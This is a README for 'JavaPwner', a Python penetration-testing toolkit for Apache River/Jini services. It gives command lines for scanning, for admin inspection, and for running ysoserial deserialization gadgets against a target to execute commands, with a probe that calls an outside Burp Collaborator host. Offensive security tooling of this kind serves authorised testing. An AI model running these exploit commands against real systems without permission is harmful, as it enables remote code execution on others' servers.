# JavaPwner

Python pentest toolkit targeting Java middleware protocols. Starts with Apache River / Jini (port 4160).

## Requirements

- Python 3.10+
- Java JDK (pour compilation et exécution — `java` + `javac`)
- [ysoserial-all.jar](https://github.com/frohoff/ysoserial/releases) → place as `lib/ysoserial.jar`

## Install

```bash
python -m venv .venv && source .venv/bin/activate
pip install -e .
```

## Usage

```bash
# Scan (Tier 1 — heuristique, sans JVM)
javapwner jini scan -t 192.168.1.10

# Scan avec inspection Tier 2 (nécessite JDK + JARs River, voir ci-dessous)
javapwner jini scan -t 192.168.1.10 --tier2

# Inspection admin dédiée (Tier 2)
javapwner jini admin -t 192.168.1.10

# List available gadgets
javapwner jini gadgets

# Exploit
javapwner jini exploit -t 192.168.1.10 --gadget CommonsCollections6 --cmd 'id'

# Probe for JEP290 filters (URLDNS)
javapwner jini exploit -t 192.168.1.10 --gadget URLDNS --cmd http://cb.burpcollaborator.net \
  --jep290-probe --dns-url http://cb.burpcollaborator.net
```

Global flags: `--verbose`, `--json`, `--timeout`, `--ysoserial <path>`

## Tier 2 — Setup JVM Bridge (Kali Linux)

Le Tier 2 permet de se connecter réellement au Registrar Jini pour :
- Vérifier si le Registrar est `Administrable` (appel `getAdmin()`)
- Détecter les capacités admin : `JoinAdmin`, `DestroyAdmin`, `StorageLocationAdmin`
- Lister tous les services enregistrés dans le Lookup Service

Les JARs Apache River (`jsk-lib`, `jsk-platform`) sont déjà inclus dans `lib/`.
Seul prérequis : un JDK.

```bash
sudo apt update && sudo apt install -y default-jdk
java -version && javac -version
```

Vérifier le setup :

```bash
javapwner jini admin -t 192.168.1.10
```

Si un prérequis manque, l'outil affiche un message d'erreur explicite.

### Configuration avancée

Au lieu de copier les JARs dans `lib/`, vous pouvez utiliser :

| Méthode | Exemple |
|---|---|
| Flag `--classpath` | `javapwner jini scan -t HOST --tier2 --classpath /opt/river/lib/jsk-lib.jar:/opt/river/lib/jsk-platform.jar` |
| Variable `JINI_CLASSPATH` | `export JINI_CLASSPATH=/opt/river/lib/jsk-lib.jar:/opt/river/lib/jsk-platform.jar` |
| Variable `RIVER_HOME` | `export RIVER_HOME=/opt/river` (cherche automatiquement dans `lib/`) |
| Variable `JAVA_HOME` | `export JAVA_HOME=/usr/lib/jvm/java-17-openjdk-amd64` |

## Tests

```bash
pip install -e ".[dev]"
pytest tests/
```

Live integration tests (require a running Reggie):
```bash
JINI_TARGET_HOST=192.168.1.10 pytest tests/integration/ -m live
```
